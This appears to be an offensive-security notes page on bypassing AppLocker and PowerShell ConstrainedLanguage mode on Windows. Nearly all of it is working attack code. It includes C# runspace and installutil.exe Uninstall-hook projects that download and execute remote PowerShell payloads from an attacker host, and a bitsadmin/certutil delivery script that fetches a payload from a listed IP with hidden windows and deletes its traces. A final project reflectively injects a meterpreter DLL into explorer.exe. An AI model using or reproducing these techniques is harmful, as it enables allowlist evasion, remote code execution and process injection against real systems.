---
title: PowerShell AppLocker bypass
tags:
  - breach
  - operations
  - applocker
  - powershell
  - bypass
  - allowlist
  - whitelist
---

## Language modes

To get our current user's **PowerShell** language mode, invoke the following:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Under `ConstrainedLanguage` mode, only scripts that comply with the
**AppLocker** allowlist, existing within a allowlisted directory or comply with
a allowlisting rule, can execute with full functionality. These limitations also
restrict users from invoking the **.NET** framework from PowerShell to execute
C# code or conduct reflection.

## Creating a custom runspace

PowerShell functionality exists within the `System.Management.Automation.dll`
managed DLL, used by PowerShell to create a **runspace**. **Runspaces** are how
PowerShell managed jobs, multithreading, and parallel task execution, accessible
to managed code written in C# and .NET.

Creating a C# .NET project, we can create our own runspace with the following
code, bypassing the `ConstrainedLanguage` mode, and executing a PowerShell
**meterpreter** reverse shell payload:

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main()
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "(Invoke-RestMethod -Uri 'http://${LHOST}:${LPORT}/Payload.ps1' -UseBasicParsing) | Invoke-Expression";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

## Bypass directory restrictions with installutil

Using code from our C# .NET project in the previous section,
[[powershell-applocker-bypass#Creating a custom runspace|Creating a custom runspace]],
we can create a project with valid symbols for the Windows `installutil.exe`
utility:

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main()
        {
            Console.WriteLine("");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "(Invoke-RestMethod -Uri 'http://${LHOST}:${LPORT}/Payload.ps1' -UseBasicParsing) | Invoke-Expression";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

### Transferring the payload

The problem with using `installutil.exe` is that the payload needs to be written
to disk, creating an opening for Windows Defender to scan and inspect our
payload during download as well as storage on the host. We can use a combination
of `bitsadmin.exe` and `certutil.exe` to securely transfer the payload and
execute it.

The following invocation uses `certutil.exe` to encode the payload:

```powershell
certutil -encode "${PAYLOAD_PATH}" "${OUTFILE}"
```

The following invocation downloads the encoded payload from your attacker host
and executes it:

```powershell
$InstallUtilProgram = (Get-ChildItem `
	-ErrorAction SilentlyContinue `
	-Path "C:\Windows" `
	-Filter "installutil.exe" `
	-Recurse `
	-File | Where-Object {$_.FullName -Like "*Framework64\v4*"}).FullName
$BitsAdminProgram = (Get-Command -Name "bitsadmin").Source
$CertUtilProgram = (Get-Command -Name "certutil").Source

$lHost = "192.168.45.190"
$lPort = "80"
$encodedFileName = "encoded.txt"
$uri = "http://${lHost}:${lPort}/$encodedFileName"
$decodedFileName = "Bypass.exe"
$encodedFilePath = (Join-Path `
	-Path (Resolve-Path -Path .).Path `
	-ChildPath $encodedFileName
)
$decodedFilePath = (Join-Path `
	-Path (Resolve-Path -Path .).Path `
	-ChildPath $decodedFileName
)

Start-Process `
	-FilePath $BitsAdminProgram `
	-ArgumentList @(
		"/TRANSFER",
		"transferJob",
		$uri,
		$encodedFilePath
	) `
	-WindowStyle Hidden `
	-Wait

Start-Process `
    -FilePath $CertUtilProgram `
    -ArgumentList @(
	    "-decode",
	    $encodedFilePath,
	    $decodedFilePath
    ) `
    -WindowStyle Hidden `
    -Wait

Remove-Item -Path $encodedFilePath

Start-Process `
    -FilePath $InstallUtilProgram `
    -ArgumentList @(
	    "/LogFile=",
	    "/LogToConsole=false",
	    "/U",
	    $decodedFilePath
    ) `
    -WindowStyle Hidden
```

Make sure to host your payload on an HTTP server that supports `bitsadmin`, e.g.
`apache2`:

```bash
sudo systemctl start apache2
```

## Reflective DLL injection

Using
[Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
from **PowerSploit**, we can also inject meterpreter reverse shell payload DLLs
into target processes through this PowerShell code execution bypass using C#
.NET.

The following C# .NET project uses the previous `installutil.exe` technique to
download a payload from our attacker host and inject it into the `explorer.exe`
process:

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main()
        {
            Console.WriteLine("");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd =
@"$bytes = (Invoke-WebRequest -Uri 'http://${LHOST}:${LPORT}/Payload.dll' -UseBasicParsing).Content
(Invoke-RestMethod -Uri 'http://${LHOST}:${LPORT}/Invoke-ReflectivePEInjection.ps1') | Invoke-Expression
$procid = (Get-Process -Name explorer).Id
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid -ErrorAction SilentlyContinue";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
